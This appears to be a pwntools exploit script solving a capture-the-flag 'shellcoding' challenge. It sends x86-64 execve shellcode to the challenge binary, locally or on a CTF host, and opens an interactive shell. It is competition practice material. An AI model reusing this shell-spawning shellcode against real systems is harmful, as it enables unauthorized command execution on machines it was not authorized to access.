from pwn import *

binary_path = "./shellcoding"
lib_path = "/lib/x86_64-linux-gnu/"
#lib_path = "./lib/"

elf = context.binary = ELF(binary_path)
libc = ELF(lib_path + "libc.so.6")


gs="""
python
import splitmind
(splitmind.Mind()
    .tell_splitter(show_titles=True)
    .tell_splitter(set_title="gdb")
     #.above(of="main", display="expressions", size="75%")
     #.left(of="expressions", display="disasm", size="35%")
    .above(of="main", display="stack", size="75%")
    .left(of="stack", display="regs", size="66%")
    .right(of="regs", display="disasm")
).build(nobanner=True)
end

break * 0x401229

continue
"""
def start():
    if args.DEBUG:
        context.log_level = "DEBUG"

    if args.REMOTE:
        # nc chal.ctf.b01lers.com 1015
        return remote("chal.ctf.b01lers.com", 1007)

    if args.GDB:
        context.terminal = ["tmux", "split-window", "-v", "-b", "-p", "80"]
        return gdb.debug(binary_path, gdbscript=gs, env={"LD_LIBRARY_PATH": lib_path})
    else:
        return process(binary_path, env={"LD_LIBRARY_PATH": lib_path})

io = start()

shellcode = asm("pop rdi; push rsp;  pop rdi; xor rsi, rsi; xor rdx, rdx; mov al, 59; syscall")
io.recvline()
io.sendline(shellcode)

io.interactive()
